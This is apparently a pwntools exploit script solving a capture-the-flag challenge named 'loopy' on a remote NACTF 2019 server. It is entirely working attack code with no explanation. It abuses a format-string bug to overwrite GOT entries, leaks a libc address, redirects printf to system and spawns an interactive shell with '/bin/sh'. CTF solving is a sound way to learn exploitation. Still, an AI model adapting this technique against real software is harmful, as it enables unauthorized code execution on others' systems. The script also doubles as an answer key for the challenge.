from pwn import *

e = ELF("./loopy")
libc = ELF("./libc.so.6")

#p = process(e.path)
p = remote("shell.2019.nactf.com", 31732)

print("{:#x}".format(e.got["printf"]))
payload = ""
payload += ("%" + str((e.symbols["vuln"] - 9) % 0x10000) + "x").ljust(16)
payload += "%13$hn".ljust(8)
payload += p32(e.got["__stack_chk_fail"]) 
payload = payload.ljust(64) + "A" * 4

p.sendline(payload)

payload = ""
payload += "STA%11$sEND".ljust(16)
payload += p64(e.got["printf"]) # \x58\x12\x60\x00\x00\x00\x00\x00
payload = payload.ljust(64) + "A" * 4
p.sendline(payload)

p.recvuntil("STA")
base = u32(p.recvuntil("END", drop=True)[:4]) - libc.symbols["printf"]

goal = base + libc.symbols["system"]
first = goal % 0x10000
second = goal // 0x10000

print("{:#x}".format(base + libc.symbols["system"]))
payload = ""
payload += ("%" + str(first - 9) + "x").ljust(16)
payload += "%19$hn".ljust(8)
payload += ("%" + str(second - first - 11) + "x").ljust(16)
payload += "%20$hn".ljust(8)
payload += p32(e.got["printf"]) 
payload += p32(e.got["printf"] + 2) 
payload = payload.ljust(64) + "A" * 4

p.sendline(payload)
p.clean()

p.sendline("/bin/sh")

p.interactive()
